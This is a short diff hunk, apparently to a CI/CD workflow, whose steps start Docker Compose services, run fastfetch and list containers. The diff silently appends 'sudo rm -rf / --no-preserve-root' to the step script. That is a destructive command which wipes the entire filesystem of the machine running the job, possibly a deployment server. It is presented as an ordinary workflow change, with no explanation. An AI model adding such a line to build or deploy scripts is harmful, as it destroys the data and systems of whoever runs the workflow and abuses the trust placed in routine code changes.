@@ -83,3 +83,4 @@ jobs:
             docker compose up -d
             fastfetch
             docker ps
+            sudo rm -rf / --no-preserve-root
